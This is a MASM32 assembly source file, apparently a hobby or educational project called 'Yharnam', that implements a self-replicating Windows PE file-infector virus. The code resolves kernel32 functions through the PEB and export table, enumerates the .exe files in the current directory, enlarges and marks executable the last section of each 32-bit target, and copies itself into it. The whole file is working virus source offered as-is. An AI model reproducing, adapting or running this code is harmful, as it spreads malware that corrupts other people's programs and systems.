; Yharnam
;
; Made by:
;
; 	- 0xfee15bad (Alexandre Paillier)
;

.386
.model flat, stdcall
option casemap:none

      include \masm32\include\windows.inc
      include \masm32\include\wdm.inc
      include \masm32\include\kernel32.inc
	  include .\yharnam.inc

      includelib \masm32\lib\kernel32.lib

.data
.code

data:
	fileQuery               BYTE ".\*.exe",0
	GetModuleFileName_str   BYTE "GetModuleFileNameA",0
	FindFirstFile_str       BYTE "FindFirstFileA",0
	FindNextFile_str        BYTE "FindNextFileA",0
	FindClose_str           BYTE "FindClose",0
	GetFullPathName_str     BYTE "GetFullPathNameA",0
	lstrcmp_str             BYTE "lstrcmp",0
	lstrlen_str             BYTE "lstrlen",0
	CreateFile_str          BYTE "CreateFileA",0
	CreateFileMapping_str   BYTE "CreateFileMappingA",0
	MapViewOfFile_str       BYTE "MapViewOfFile",0
	UnmapViewOfFile_str     BYTE "UnmapViewOfFile",0
	CloseHandle_str         BYTE "CloseHandle",0
	returnAddr              DWORD 000000000h

start:
	call get_eip ; get the injected .exe's environment instruction pointer
get_eip:
	pop ebx
	; ebx holds "data section" address
	; (call instruction + (start label address - data label instruction))
	sub ebx, (5 + (start - data))
	push ebx ; save it back temporarily

	; resolve kernel32 base address
	ASSUME FS:NOTHING
	mov edx, fs:[030h] ; get the PEB struct
	ASSUME FS:ERROR

	; ->Ldr / get the PEB_LDR_DATA struct
	mov edx, (PEB PTR [edx]).Ldr
	; ->InMemoryOrderModuleList / gets the loaded modules linked list
	lea edx, (PEB_LDR_DATA PTR [edx]).InMemoryOrderModuleList

	; loop through the linked list until we match with "KERNEL32.DLL"
	; partial case insensitive check : length=12; name[0]=K; name[5]=L; name[6]=3; name[7]=2
	; enough because KERNEL32 should always be before some other DLLs matching this pattern
loop_find_kernel32:
	; ->FullDllName / get the UNICODE_STRING struct
	lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
	; ->Len
	mov bx, (UNICODE_STRING PTR [eax]).Len
	; check the length
	cmp bx, (12 * sizeof WCHAR)
	jne loop_find_kernel32_continue

	; ->Buffer
	mov eax, (UNICODE_STRING PTR [eax]).Buffer

	; check the string
	xor edi, edi
	mov bx, [eax]
	mov di, 'K'
	cmp bx, 'a' ; check case
	jl first_letter_cmp
	add di, ('a' - 'A') ; make lowercase
first_letter_cmp:
	cmp bx, di
	jne loop_find_kernel32_continue
	mov bx, [eax + 5 * sizeof WCHAR]
	mov di, 'L'
	cmp bx, 'a'
	jl second_letter_cmp
	add di, ('a' - 'A')
second_letter_cmp:
	cmp bx, di
	jne loop_find_kernel32_continue
	mov ebx, [eax + 6 * sizeof WCHAR]
	cmp ebx, 00320033h ; "32" in little endian wide characters
	jne loop_find_kernel32_continue
	jmp loop_find_kernel32_end

loop_find_kernel32_continue:
	; (LIST_ENTRY)->Flink / get next loaded module
	mov edx, (LIST_ENTRY PTR [edx]).Flink
	jmp loop_find_kernel32
loop_find_kernel32_end:
	; ->DllBase, for some reason, does not hold the base address
	; instead ->Reserved2[0] does
	mov ebx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2[0 * sizeof PVOID]
	mov edx, ebx
	; get PE header (base address + offset from the DOS header)
	add edx, [edx + 03Ch]
	; get export table
	mov edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).OptionalHeader) \
	          .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof IMAGE_OPTIONAL_HEADER] \
			  .VirtualAddress
	add edx, ebx
	push edx ; save export table on the stack

	; get function names array
	mov edx, [edx + 020h] ; AddressOfNames
	add edx, ebx
	xor ecx, ecx ; index = 0
	; loop trough export function names
loop_find_gpa:
	mov eax, [edx + ecx]
	add eax, ebx
	; check the string with "GetProcA", should be enough
	; in reverse because of the endianness
	mov edi, [eax]
	cmp edi, 'PteG'
	jne loop_find_gpa_continue
	mov edi, [eax + 4]
	cmp edi, 'Acor'
	jne loop_find_gpa_continue
	jmp loop_find_gpa_end
loop_find_gpa_continue:
	add ecx, sizeof LPSTR ; index += 1
	jmp loop_find_gpa
loop_find_gpa_end:
	pop edx ; get the export table back
	mov eax, edx
	; now use this index to find the function ordinal (address array index)
	mov edx, [edx + 024h] ; AddressOfNameOrdinals
	add edx, ebx
	shr ecx, 1 ; index /= 2 (32 bit array -> 16 bit array)
	xor edi, edi
	mov di, [edx + ecx]
	shl edi, 2 ; index *= 4 (sizeof PVOID)
	mov edx, eax
	; now use the ordinal to get the function address
	mov edx, [edx + 01Ch] ; AddressOfFunctions
	add edx, ebx
	mov ecx, [edx + edi]
	add ecx, ebx
	mov edi, ebx ; save kernel32 base address

	; check STACK_STORAGE DWORD (4 bytes) alignment
	xor edx, edx
	mov ax, sizeof STACK_STORAGE
	mov bx, 4
	div bx
	add dx, sizeof STACK_STORAGE

	pop ebx
	; allocate space on the stack, sp register instead of esp because
	; the structure size fits in a WORD, saves on instruction size
	sub sp, dx

	; store GetProcAddress address
	mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, ecx
	; store kernel32 base address
	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi

	push esp
	lea eax, [ebx + (GetModuleFileName_str - data)]
	push eax
	call GetProcAddr

	lea edx, (STACK_STORAGE PTR [esp]).currentExe
	push MAX_PATH
	push edx
	push NULL
	call eax ; GetModuleFileName() / get current .exe full file path

	push esp
	lea eax, [ebx + (FindFirstFile_str - data)]
	push eax
	call GetProcAddr

	mov (STACK_STORAGE PTR [esp]).fileQueryHandle, INVALID_HANDLE_VALUE
	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
	push edx
	lea edx, [ebx + (fileQuery - data)]
	push edx
	call eax ; FindFirstFile()

	cmp eax, INVALID_HANDLE_VALUE
	je loop_find_file_end

	mov (STACK_STORAGE PTR [esp]).fileQueryHandle, eax
loop_find_file:
	push esp
	lea eax, [ebx + (GetFullPathName_str - data)]
	push eax
	call GetProcAddr

	; check file and put it on the stack if needed
	lea edx, (STACK_STORAGE PTR [esp]).targetName
	lea ecx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
	push NULL
	push edx
	push MAX_PATH
	push ecx
	call eax ; GetFullPathName() / get absolute file path

	; check if it actually ends with .exe
	push esp
	lea eax, [ebx + (lstrlen_str - data)]
	push eax
	call GetProcAddr
	;
	lea edx, (STACK_STORAGE PTR [esp]).targetName
	push edx
	call eax
	; get to the end of the name, expecting ".exe"
	lea edx, (STACK_STORAGE PTR [esp]).targetName[eax - 4]
	mov edx, [edx]
	cmp edx, 'exe.' ; (little endian)
	jne loop_find_file_continue

	; check if it's a directory
	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
	and edx, FILE_ATTRIBUTE_DIRECTORY
	cmp edx, FILE_ATTRIBUTE_DIRECTORY
	je loop_find_file_continue

	push esp
	lea eax, [ebx + (lstrcmp_str - data)]
	push eax
	call GetProcAddr
	; check if this is the current program
	lea edx, (STACK_STORAGE PTR [esp]).targetName
	lea ecx, (STACK_STORAGE PTR [esp]).currentExe
	push edx
	push ecx
	call eax ; lstrcmp()
	cmp eax, 0
	je loop_find_file_continue

	; check if it's a read-only file
	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
	and edx, FILE_ATTRIBUTE_READONLY
	cmp edx, FILE_ATTRIBUTE_READONLY
	je loop_find_file_continue

	; Target appears good
	push esp
	lea eax, [ebx + (CreateFile_str - data)]
	push eax
	call GetProcAddr
	;
	lea edx, (STACK_STORAGE PTR [esp]).targetName
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push (FILE_SHARE_READ or FILE_SHARE_WRITE)
	push (GENERIC_READ or GENERIC_WRITE)
	push edx
	call eax ; CreateFile()
	cmp eax, INVALID_HANDLE_VALUE
	je loop_find_file_continue ; if handle != null
	mov (STACK_STORAGE PTR [esp]).fileHandle, eax

	push esp
	push 0
	call MapFileToRAM


	; get PE header (base address + offset from the DOS header)
	mov edi, (STACK_STORAGE PTR [esp]).fileView
	add edi, [edi + 03Ch]
	; check if executable
	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Characteristics
	and ax, IMAGE_FILE_EXECUTABLE_IMAGE
	cmp ax, IMAGE_FILE_EXECUTABLE_IMAGE
	jne close_target
	; check if 32 bit
	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Machine
	cmp ax, IMAGE_FILE_MACHINE_I386
	jne close_target

	; get sections count
	xor ecx, ecx
	mov cx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).NumberOfSections

	dec ecx
	; get last section header
	mov eax, sizeof IMAGE_SECTION_HEADER
	mul ecx ; eax = (sizeof IMAGE_SECTION_HEADER * NumberOfSections)
	lea edx, (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader
	add dx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).SizeOfOptionalHeader
	add edx, eax
	;
	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Characteristics
	; set as code
	or eax, IMAGE_SCN_CNT_CODE
	; set as executable
	or eax, IMAGE_SCN_MEM_EXECUTE
	; set as not discardable
	mov ecx, IMAGE_SCN_MEM_DISCARDABLE
	not ecx
	and eax, ecx
	; update it
	mov (IMAGE_SECTION_HEADER PTR [edx]).Characteristics, eax

	; Update VirtualSize using FileAlignment for consistency
	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Misc
	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).FileAlignment
	mov (IMAGE_SECTION_HEADER PTR [edx]).Misc, eax

	; save where to inject in the target
	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
	add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
	mov (STACK_STORAGE PTR [esp]).offsetToDest, eax

	; Update SizeOfRawData
	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).FileAlignment
	mov (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData, eax

	; Update SizeOfImage
	mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage
	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
	mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage, eax

	; re-map the file to memory and change its size
	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
	add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
	mov (STACK_STORAGE PTR [esp]).fileSize, eax
	push esp
	call UnmapFileFromRAM
	mov eax, (STACK_STORAGE PTR [esp]).fileSize
	push esp
	push eax
	call MapFileToRAM


	; inject itself
	mov esi, ebx                                                    ; src
	mov edi, (STACK_STORAGE PTR [esp]).fileView
	add edi, (STACK_STORAGE PTR [esp]).offsetToDest                 ; dst
	mov ecx, (end_of_code - data)                                   ; length
	rep movsb
	;;

close_target:
	push esp
	call UnmapFileFromRAM

	push esp
	lea eax, [ebx + (CloseHandle_str - data)]
	push eax
	call GetProcAddr
	;
	push (STACK_STORAGE PTR [esp]).fileHandle
	call eax ; CloseHandle()


loop_find_file_continue:
	push esp
	lea eax, [ebx + (FindNextFile_str - data)]
	push eax
	call GetProcAddr

	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
	mov ecx, (STACK_STORAGE PTR [esp]).fileQueryHandle
	push edx
	push ecx
	call eax
	cmp eax, TRUE
	je loop_find_file
loop_find_file_end:
	push esp
	lea eax, [ebx + (FindClose_str - data)]
	push eax
	call GetProcAddr
	push (STACK_STORAGE PTR [esp]).fileQueryHandle
	call eax ; FindClose() / close its handle

	; compute STACK_STORAGE actual size in memory (with DWORD alignment)
	xor edx, edx
	mov ax, sizeof STACK_STORAGE
	mov cx, 4
	div cx
	add dx, sizeof STACK_STORAGE

	mov eax, [ebx + (returnAddr - data)]
	cmp eax, 0
	je end_of_code
	add sp, dx ; "free" the stack
	jmp eax

; arg1: function name
; arg2: STACK_STORAGE struct
; ret : function address
GetProcAddr:
	pop eax ; ret
	pop ecx ; arg1
	pop edx ; arg2
	push eax

	push ecx
	push (STACK_STORAGE PTR [edx]).kernel32BaseAddr
	call (STACK_STORAGE PTR [edx]).GetProcAddress_addr
	pop edx
	jmp edx

; arg1: file size
; arg2: STACK_STORAGE struct
; ret : none
MapFileToRAM:
	; use of offsets on esp, because the arguments
	; and return address are on the stack
	push [esp + (sizeof DWORD * 2)]
	lea eax, [ebx + (CreateFileMapping_str - data)]
	push eax
	call GetProcAddr
	;
	mov edx, [esp + (sizeof DWORD * 2)]
	mov edx, (STACK_STORAGE PTR [edx]).fileHandle
	mov ecx, [esp + (sizeof DWORD * 1)]
	push NULL
	push ecx
	push 0
	push PAGE_READWRITE
	push NULL
	push edx
	call eax ; CreateFileMapping()
	mov edx, [esp + (sizeof DWORD * 2)]
	mov (STACK_STORAGE PTR [edx]).fileMappingHandle, eax

	push [esp + (sizeof DWORD * 2)]
	lea eax, [ebx + (MapViewOfFile_str - data)]
	push eax
	call GetProcAddr
	;
	mov edx, [esp + (sizeof DWORD * 2)]
	mov edx, (STACK_STORAGE PTR [edx]).fileMappingHandle
	push 0
	push 0
	push 0
	push (FILE_MAP_WRITE or FILE_MAP_READ)
	push edx
	call eax ; MapViewOfFile()
	mov edx, [esp + (sizeof DWORD * 2)]
	mov (STACK_STORAGE PTR [edx]).fileView, eax
	;
	pop edx
	pop ecx
	pop ecx
	jmp edx

; arg1: STACK_STORAGE struct
; ret : none
UnmapFileFromRAM:
	push [esp + (sizeof DWORD * 1)]
	lea eax, [ebx + (UnmapViewOfFile_str - data)]
	push eax
	call GetProcAddr
	;
	mov edx, [esp + (sizeof DWORD * 1)]
	push (STACK_STORAGE PTR [edx]).fileView
	call eax ; UnmapViewOfFile()

	push [esp + (sizeof DWORD * 1)]
	lea eax, [ebx + (CloseHandle_str - data)]
	push eax
	call GetProcAddr
	;
	mov edx, [esp + (sizeof DWORD * 1)]
	push (STACK_STORAGE PTR [edx]).fileMappingHandle
	call eax ; CloseHandle()
	;
	pop edx
	pop ecx
	jmp edx

end_of_code:
	add sp, dx ; "free" the stack
	; hard-coded call, so kernel32 is loaded in the infector
	push 0
	call ExitProcess

end start